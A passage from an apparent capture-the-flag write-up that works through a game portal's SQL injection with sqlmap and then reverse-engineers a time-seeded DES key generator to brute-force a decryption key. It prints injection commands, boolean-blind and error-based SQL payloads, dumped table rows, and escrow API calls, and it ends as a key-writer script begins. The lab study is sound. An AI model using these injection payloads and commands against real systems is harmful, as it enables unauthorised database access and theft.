    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;entry_response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="neeext-student-body-finding-some-scrap-papers-objective-9"&gt;NEEEXT! Student Body finding some scrap papers objective 9&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Got some hints in the game talking about sqlmap. Let's play with that and learn about &lt;a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)"&gt;SQL injections&lt;/a&gt; :)&lt;ul&gt;
&lt;li&gt;Started by looking at the page and reading the source code. Identified two forms on two pages that looked interesting.&lt;/li&gt;
&lt;li&gt;First went down a rabbit hole of the sqlmap tamper scripts.&lt;/li&gt;
&lt;li&gt;Just doing this:&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="nv"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl&lt;span class="w"&gt; &lt;/span&gt;validation&lt;span class="k"&gt;)&lt;/span&gt;
sqlmap&lt;span class="w"&gt; &lt;/span&gt;--url&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://url?token=&lt;/span&gt;&lt;span class="nv"&gt;$token&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;variable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;Got sqlmap to find that elfmail in the check.php was vulnerable.&lt;/li&gt;
&lt;li&gt;a curl "https://url?elfmail=me@me.com'token=$token"&lt;ul&gt;
&lt;li&gt;got a noice SQL error!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tamper investigation was not wasted because&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="nv"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl&lt;span class="w"&gt; &lt;/span&gt;validation&lt;span class="k"&gt;)&lt;/span&gt;
sqlmap&lt;span class="w"&gt; &lt;/span&gt;--url&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php?elfmail=my%40example.com&amp;amp;token=&lt;/span&gt;&lt;span class="nv"&gt;$token&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;elfmail&lt;span class="w"&gt; &lt;/span&gt;--eval&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import requests;token=requests.get(&amp;#39;https://studentportal.elfu.org/validator.php&amp;#39;).text&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;was needed to get sqlmap to find some techniques. Presumably the token only worked for the first tests.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#SNIPSNIP&lt;/span&gt;
&lt;span class="n"&gt;Parameter&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;elfmail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;boolean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;boolean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HAVING&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;clause&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;elfmail&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;my&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; AND 2977=2977 AND &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;tYvj&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;tYvj&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MTAwOTU4MTk3Njk2MTU3NzQ3MTgzOTEwMDk1ODE5Ny42OTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_MTI5MjI2NDkzMDUwODgzMjMwNjYyMzI2LjI3Mg&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WHERE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HAVING&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GROUP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;clause&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FLOOR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;elfmail&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;me&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; AND (SELECT 4602 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(4602=4602,1))),0x7162626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;XazW&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;XazW&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MTAwOTU4MTk3Njk2MTU3NzQ3MTgzOTEwMDk1ODE5Ny42OTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_MTI5MjI2NDkzMDUwODgzMjMwNjYyMzI2LjI3Mg&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Could not get the above queries to work in a curl.. maybe some escape messup. But sqlmap --users find stuff.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;18:51:19&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;retrieved&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;elfu&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;18:51:20&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;retrieved&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;applications&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;18:51:21&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;retrieved&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;elfu&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;18:51:22&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;retrieved&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;krampus&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;18:51:23&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;retrieved&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;elfu&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;sqlmap had a nice --sql-shell and with that one could "select * from elfu.krampus" which got us some paths:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;select * from elfu.krampus [6]:
[*] /krampus/0f5f510e.png, 1
[*] /krampus/1cc7e121.png, 2
[*] /krampus/439f15e6.png, 3
[*] /krampus/667d6896.png, 4
[*] /krampus/adb798ca.png, 5
[*] /krampus/ba417715.png, 6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now then that looks like an OS path, need to run a shell command.. but on a whim tried &lt;a href="https://studentportal.elfu.org/krampus/"&gt;https://studentportal.elfu.org/krampus/&lt;/a&gt; and yay found them there. Fired up good old GIMP and learnt about the rotate tool :P Yay, &lt;strong&gt;one&lt;/strong&gt; more objective!&lt;/p&gt;
&lt;h2 id="remaining-are-reversing-some-crypto-windows-executable-and-the-ban-the-ips-in-the-firewall-for-the-route-api"&gt;Remaining are reversing some crypto windows executable and the ban the IPs in the firewall for the route API&lt;/h2&gt;
&lt;p&gt;Crypto then. Hint is &lt;a href="https://www.youtube.com/watch?v=obJdpKDpFBA&amp;amp;feature=youtu.be"&gt;https://www.youtube.com/watch?v=obJdpKDpFBA&amp;amp;feature=youtu.be&lt;/a&gt; &amp;gt; &lt;a href="https://github.com/CounterHack/reversing-crypto-talk-public"&gt;https://github.com/CounterHack/reversing-crypto-talk-public&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Running an encryption tells us it uses unix epoch as a seed and a hint to the challenge was " We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. " This is from &lt;strong&gt;1575658800 to 1575666000&lt;/strong&gt; . There are some super_secure_random and super_secure_srand functions found with IDA freeware. Probably they are not super. &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey"&gt;https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey&lt;/a&gt; for example is one in use. I wonder what the difference with --insecure is? One error talks about &lt;a href="https://crypto.stackexchange.com/questions/62771/is-des-secure-under-cbc"&gt;DES-CBC&lt;/a&gt; which internet says is insecure. It uses 56-bits and 8bytes. Stack of do_encrypt also says "dd 8" so yay?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;00000000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;00000008&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BYTES&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;COLLAPSED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;_LARGE_INTEGER&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PRESS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CTRL&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;NUMPAD&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;TO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;EXP&lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;
&lt;span class="mf"&gt;00000000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;00000008&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BYTES&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;COLLAPSED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;STRUCT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;FAF74743FBE1C8632047CFB668F7028A&lt;/span&gt;&lt;span class="mf"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PRESS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CTRL&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;NUMPAD&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kr"&gt;TO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;EXP&lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Which is used in security_init_cookie And imp__QueryPerformanceCounter. Way more than 8 bytes though.&lt;/p&gt;
&lt;p&gt;While looking at these listened to the youtube talk and it said "running it at the same time generates the same key" - tried that with two identical files and it generated the same key. What about with two files without same checksum? Yep. Same. Encryption key. So next step would be to try to encrypt something for every second between &lt;strong&gt;1575658800 to 1575666000&lt;/strong&gt; ? That's 7200. Which would give us 7200 keys we could try to use to decrypt the file. Is it too much? Right now I'm thinking the --insecure might help if one use the Burp suite to intercept the packages to the elfscrow api server? The time bit in the code uses time64&lt;/p&gt;
&lt;p&gt;call time into eax&lt;br&gt;
then eax as a parameter into:&lt;br&gt;
call super_secure_srand&lt;br&gt;
there is a loop (8) and inside that it calls super_secure_random which looks complicated but by googling the numbers in decimal we find: &lt;a href="https://rosettacode.org/wiki/Linear_congruential_generator#C"&gt;https://rosettacode.org/wiki/Linear_congruential_generator#C&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;which has&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;rseed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;214013&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2531011&lt;/span&gt;
#&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;disasembled&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;does&lt;/span&gt;:
&lt;span class="nv"&gt;sar&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nv"&gt;eax&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="nv"&gt;h&lt;/span&gt;
&lt;span class="nv"&gt;and&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nv"&gt;eax&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="nv"&gt;FFFh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Which is also here: http://cer.freeshell.org/renma/LibraryRandomNumber/&lt;br&gt;
And here I learnt that &amp;gt;&amp;gt; in python is the sar.&lt;/p&gt;
&lt;p&gt;After goin walking thought a bit about what is the end goal here. And it is not the key, but it could be. Right now plan is to generate the secret-id, because the secret-id is what is used to decrypt with the tool, not the key. But maybe the uuid is something you only get from the escrow API server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;curl&lt;span class="w"&gt; &lt;/span&gt;-XPOST&lt;span class="w"&gt; &lt;/span&gt;http://elfscrow.elfu.org/api/store&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;1234567890abcdef
0e5b05dd-e132-42aa-b699-1829d3e23e2f
$&lt;span class="w"&gt; &lt;/span&gt;curl&lt;span class="w"&gt; &lt;/span&gt;-XPOST&lt;span class="w"&gt; &lt;/span&gt;http://elfscrow.elfu.org/api/retrieve&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;0e5b05dd-e132-42aa-b699-1829d3e23e2f
1234567890abcdef
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Seems it is. And the hex needs to be in lower letters. ABCDEF did not fly. UUID must be in this format: 00000000-0000-0000-0000-000000000000 it seems. Not sure about sqlmap use here. . SSH and web server is running. But SSH has been open on several previous addresses in this CTF too..&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt; WEBrick/1.4.2 (Ruby/2.6.3/2019-04-16) at
 elfscrow.elfu.org:443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Actually what might be doable with just the key is to: setup my own API server that just returns the key.. &lt;em&gt;Change the address in the binary or finally use BURP or local DNS override?&lt;/em&gt; Still need to figure out the key :))&lt;/p&gt;
&lt;h2 id="lets-try-to-read-the-do_encrypt-again"&gt;Let's try to read the do_encrypt again&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;call read_file&lt;/li&gt;
&lt;li&gt;set some crypto vars&lt;/li&gt;
&lt;li&gt;call CryptAcquireContext&lt;/li&gt;
&lt;li&gt;call generate_key&lt;ol&gt;
&lt;li&gt;key goes into eax register I think&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;call print_hex&lt;/li&gt;
&lt;li&gt;more crypto&lt;/li&gt;
&lt;li&gt;call CryptImport and CryptEncrypt&lt;/li&gt;
&lt;li&gt;call store_key and write_file&lt;/li&gt;
&lt;li&gt;call security_check_cookie&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Generate_key does:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;call time&lt;/li&gt;
&lt;li&gt;call &lt;strong&gt;super_secure_srand&lt;/strong&gt;, probably with file,time and seed as args&lt;/li&gt;
&lt;li&gt;loop 8 times and call &lt;strong&gt;super_secure_random&lt;/strong&gt; to modify state?&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="n"&gt;super_secure_random&lt;/span&gt;&lt;span class="nb"&gt;@@YAHXZ&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;super_secure_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;movzx&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;
&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;FFh&lt;/span&gt;
&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebp+buffer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;add&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebp+i&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cl&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;super_secure_srand does:&lt;br&gt;
&lt;em&gt;something with seed.. really unsure&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;super_secure_srandom does:&lt;br&gt;
this is doing the rseed, sar, and&lt;/p&gt;
&lt;h2 id="the-key-writer"&gt;The Key Writer&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python3&lt;/span&gt;


&lt;span class="c1"&gt;# key examples&lt;/span&gt;

&lt;span class="c1"&gt;# dcd5ed4c2acba87e&lt;/span&gt;
&lt;span class="c1"&gt;# 9f32148fe8ef55a8&lt;/span&gt;
&lt;span class="c1"&gt;# 0d2bac4df0a12e5a&lt;/span&gt;
&lt;span class="c1"&gt;# fa41fb5131993bf5&lt;/span&gt;

&lt;span class="c1"&gt;#https://www.aldeid.com/wiki/X86-assembly/Instructions/shr&lt;/span&gt;
&lt;span class="c1"&gt;# like the &amp;gt;&amp;gt; much more than ^&lt;/span&gt;

&lt;span class="c1"&gt;# https://rosettacode.org/wiki/Linear_congruential_generator#Python&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;msvcrt_rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
